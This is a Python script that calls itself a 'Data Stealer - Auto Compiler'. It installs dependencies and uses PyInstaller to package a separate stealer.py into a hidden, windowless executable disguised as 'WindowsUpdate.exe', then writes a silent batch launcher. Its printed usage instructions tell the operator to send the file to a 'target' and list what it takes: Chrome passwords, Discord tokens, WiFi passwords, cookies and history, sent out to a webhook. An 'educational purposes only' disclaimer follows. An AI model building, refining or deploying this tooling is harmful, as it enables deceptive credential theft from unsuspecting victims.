"""
Auto-compiler script for creating standalone executable
Requires: PyInstaller
Install: pip install pyinstaller pywin32 pycryptodome psutil pyautogui
"""

import subprocess
import sys
import os
from pathlib import Path

REQUIREMENTS = [
    "pyinstaller",
    "pywin32",
    "pycryptodome",
    "psutil",
    "pyautogui",
]

def install_requirements():
    print("[*] Installing required packages...")
    for package in REQUIREMENTS:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q"])
            print(f"[✓] Installed {package}")
        except:
            print(f"[✗] Failed to install {package}")

def compile_to_exe():
    print("\n[*] Compiling to EXE...")
    
    pyinstaller_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name=WindowsUpdate",
        "--icon=NONE",
        "--add-data", ".",
        "--hidden-import", "win32crypt",
        "--hidden-import", "Crypto.Cipher.AES",
        "--hidden-import", "psutil",
        "--hidden-import", "pyautogui",
        "stealer.py"
    ]
    
    try:
        subprocess.check_call(pyinstaller_cmd)
        print("\n[✓] Successfully compiled!")
        print("[✓] EXE location: dist/WindowsUpdate.exe")
        return True
    except Exception as e:
        print(f"\n[✗] Compilation failed: {e}")
        return False

def create_batch_launcher():
    """Create a batch file that runs silently"""
    batch_content = """@echo off
start /B WindowsUpdate.exe
exit
"""
    
    with open("launch.bat", "w") as f:
        f.write(batch_content)
    
    print("[✓] Created launch.bat (runs EXE silently)")

def create_requirements_txt():
    """Create requirements.txt for easy installation"""
    with open("requirements.txt", "w") as f:
        f.write("\n".join(REQUIREMENTS))
    
    print("[✓] Created requirements.txt")

def main():
    print("="*60)
    print(" Data Stealer - Auto Compiler")
    print("="*60)
    
    if not Path("stealer.py").exists():
        print("[✗] Error: stealer.py not found in current directory!")
        return
    
    print("\n[1] Install requirements")
    print("[2] Compile to EXE")
    print("[3] Full setup (install + compile)")
    print("[4] Exit")
    
    choice = input("\nSelect option: ").strip()
    
    if choice == "1":
        install_requirements()
        create_requirements_txt()
    elif choice == "2":
        compile_to_exe()
        create_batch_launcher()
    elif choice == "3":
        install_requirements()
        create_requirements_txt()
        if compile_to_exe():
            create_batch_launcher()
    else:
        print("Exiting...")
        return
    
    print("\n" + "="*60)
    print(" USAGE INSTRUCTIONS:")
    print("="*60)
    print(" 1. Share 'WindowsUpdate.exe' with target")
    print(" 2. When executed, it will:")
    print("    - Steal all Chrome passwords")
    print("    - Extract Discord tokens")
    print("    - Grab WiFi passwords")
    print("    - Collect cookies & history")
    print("    - Send everything to webhook")
    print(" 3. Runs silently (no console window)")
    print("="*60)
    
    print("\n⚠️  WARNING: This is for EDUCATIONAL PURPOSES ONLY")
    print("⚠️  Unauthorized use is ILLEGAL and punishable by law")
    print("="*60)

if __name__ == "__main__":
    main()
